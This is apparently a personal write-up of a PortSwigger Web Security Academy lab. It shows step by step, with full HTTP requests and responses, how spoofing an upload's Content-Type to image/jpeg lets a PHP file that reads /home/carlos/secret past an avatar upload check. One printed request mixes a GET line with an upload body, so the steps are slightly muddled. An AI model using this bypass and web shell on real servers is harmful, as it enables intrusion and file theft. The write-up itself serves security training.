*This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.You can log in to your own account using the following credentials: wiener:peter*

I logged in with my credentials and uploaded a my `exploit.php` file , observing the HTTP traffic. I noticed the following in the response: 

```Burp 
HTTP/2 403 Forbidden
Date: Tue, 30 Apr 2024 11:55:52 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 231

Sorry, file type application/x-php is not allowed
        Only image/jpeg and image/png are allowed
Sorry, there was an error uploading your file.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

I then saw the request and noticed that they verify based on the MIME type for images: 

```
POST /my-account/avatar HTTP/2
Host: 0a7600c103a8bb8f80073f75003600c6.web-security-academy.net
Cookie: session=ExuMCH5UdTGmKoqMTFjS22diPajEXRbQ
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------21389428739649215862945163112
Content-Length: 542
Origin: https://0a7600c103a8bb8f80073f75003600c6.web-security-academy.net
Referer: https://0a7600c103a8bb8f80073f75003600c6.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

-----------------------------21389428739649215862945163112
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php
echo file_get_contents('/home/carlos/secret');
?>

-----------------------------21389428739649215862945163112
Content-Disposition: form-data; name="user"

wiener
-----------------------------21389428739649215862945163112
Content-Disposition: form-data; name="csrf"

IBSqtpKjgW9qGjPuuUIi9r3jlTvLfiyS
-----------------------------21389428739649215862945163112--
```

Hence I modified the `Content-Type` to as such below, edited the request line and sent it to the repeater: 

```
GET /files/avatars/exploit.php HTTP/2
Host: 0a7600c103a8bb8f80073f75003600c6.web-security-academy.net
Cookie: session=ExuMCH5UdTGmKoqMTFjS22diPajEXRbQ
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------338993837615724743744070294440
Content-Length: 539
Origin: https://0a7600c103a8bb8f80073f75003600c6.web-security-academy.net
Referer: https://0a7600c103a8bb8f80073f75003600c6.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

-----------------------------338993837615724743744070294440
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg

<?php
echo file_get_contents('/home/carlos/secret');
?>

-----------------------------338993837615724743744070294440
Content-Disposition: form-data; name="user"

wiener
-----------------------------338993837615724743744070294440
Content-Disposition: form-data; name="csrf"

IBSqtpKjgW9qGjPuuUIi9r3jlTvLfiyS
-----------------------------338993837615724743744070294440--
```

Was provided the secret in the response: 

```
HTTP/2 200 OK
Date: Tue, 30 Apr 2024 12:00:46 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 32

Rpx2ZmZ3mHmbNWt2mTNatNZbb38I3JiK
```